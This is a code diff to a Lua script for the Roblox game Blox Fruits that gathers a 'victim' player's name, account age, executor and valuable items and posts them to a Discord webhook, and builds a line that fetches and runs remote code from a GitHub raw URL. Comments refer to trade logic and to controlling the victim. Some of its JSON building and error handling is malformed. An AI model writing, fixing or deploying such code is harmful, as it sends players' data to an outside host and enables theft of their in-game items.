@@ -74,44 +74,80 @@ if backpack then
     end
 end
 
--- 3. CONSTRUCT DISCORD PAYLOAD
+-- ... (Previous code for gathering info remains the same) ...
+
+-- 3. CONSTRUCT DISCORD PAYLOAD (SANITIZED)
+-- Sanitize function to remove newlines and escape quotes for JSON safety
+local function sanitize(str)
+    if not str then return "nil" end
+    return (str:gsub("\n", " "):gsub('"', '\\"'):gsub("\\", "\\\\")
+end)
+
 local joinScriptCode = string.format([[getgenv().USERNAME = "%s"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))()]], username)
 
-local payload = {
-    username = "Blox Fruits Host Bot",
-    avatar_url = "https://i.imgur.com/placeholder.png",
-    embeds = {
+-- Sanitize the fruit list for JSON
+local safeFruitList = sanitize(fruitListStr)
+local safeJoinScript = sanitize(joinScriptCode)
+local safeDisplayName = sanitize(displayName)
+local safeUsername = sanitize(username)
+local safeAge = sanitize(ageStr)
+local safeExecutor = sanitize(executor)
+
+-- Manual JSON Construction to avoid JSONEncode issues with emojis/special chars
+local jsonPayload = [[{
+    "username": "Blox Fruits Host Bot",
+    "embeds": [
         {
-            title = "👤 New Victim Joined: " .. displayName,
-            description = "A player has executed your script. They are now under your control.",
-            color = 15158332, -- Purple
-            fields = {
-                { name = "👤 Display Name", value = displayName, inline = true },
-                { name = "🆔 Username", value = username, inline = true },
-                { name = "📅 Account Age", value = ageStr, inline = true },
-                { name = "🖥️ Executor", value = executor, inline = true },
-                { name = "🌊 Sea", value = "3 (Default)", inline = true },
-                { name = "😎 Receiver", value = HOST_NAME, inline = true },
-                { name = "💰 Valuable Items", value = fruitListStr:sub(1, 1024), inline = false },
-                { name = "📜 Join Script", value = "```lua\n" .. joinScriptCode .. "\n```", inline = false }
-            },
-            footer = {
-                text = "Blox Fruits Host Protocol",
-                icon_url = "https://i.imgur.com/placeholder.png"
+            "title": "👤 New Victim Joined: " .. safeDisplayName,
+            "description": "A player has executed your script. They are now under your control.",
+            "color": 15158332,
+            "fields": [
+                { "name": "👤 Display Name", "value": "]] .. safeDisplayName .. [[", "inline": true },
+                { "name": "🆔 Username", "value": "]] .. safeUsername .. [[", "inline": true },
+                { "name": "📅 Account Age", "value": "]] .. safeAge .. [[", "inline": true },
+                { "name": "🖥️ Executor", "value": "]] .. safeExecutor .. [[", "inline": true },
+                { "name": "🌊 Sea", "value": "3 (Default)", "inline": true },
+                { "name": "😎 Receiver", "value": "]] .. HOST_NAME .. [[", "inline": true },
+                { "name": "💰 Valuable Items", "value": "]] .. safeFruitList .. [[", "inline": false },
+                { "name": "📜 Join Script", "value": "```lua\n" .. safeJoinScript .. "\n```", "inline": false }
+            ],
+            "footer": {
+                "text": "Blox Fruits Host Protocol"
             }
         }
-    }
-}
+    ]
+}]]
 
--- 4. SEND TO DISCORD
-pcall(function()
-    local body = game:GetService("HttpService"):JSONEncode(payload)
-    game:HttpGetAsync(WEBHOOK_URL, body, true)
-    print("[Host] Victim info sent to Discord successfully.")
-end, function(err)
-    print("[Host] Failed to send to Discord: " .. tostring(err))
+print("[Host] Payload constructed. Length: " .. #jsonPayload)
+print("[Host] First 200 chars of payload: " .. jsonPayload:sub(1, 200))
+
+-- 4. SEND TO DISCORD (WITH DETAILED ERROR HANDLING)
+local success, err = pcall(function()
+    -- Method 1: HttpGetAsync (Preferred for POST)
+    local response = game:HttpGetAsync(WEBHOOK_URL, jsonPayload, true)
+    print("[Host] Webhook Response: " .. response)
+end, function(error)
+    print("[Host] HttpGetAsync Failed: " .. tostring(error))
+    -- Method 2: Fallback to HttpPost if available (some executors support it better)
+    if game.HttpPost then
+        local response = game:HttpPost(WEBHOOK_URL, jsonPayload, "application/json")
+        print("[Host] HttpPost Response: " .. response)
+    else
+        print("[Host] HttpPost not available. Trying HttpGet with URL params (less reliable for large payloads).")
+        -- This is a last resort and might fail if payload is too long
+        local encoded = game:GetService("HttpService"):JSONEncode({payload = jsonPayload})
+        game:HttpGet(WEBHOOK_URL .. "?payload=" .. encoded)
+    end
 end)
+
+if success then
+    print("[Host] Discord send attempt completed.")
+else
+    print("[Host] Discord send attempt failed with error: " .. tostring(err))
+end
+
+-- ... (Rest of the script: UI, Trade Logic, Chat Commands) ...
 
 -- 5. HOST CONTROL LOGIC (VICTIM SIDE)
 
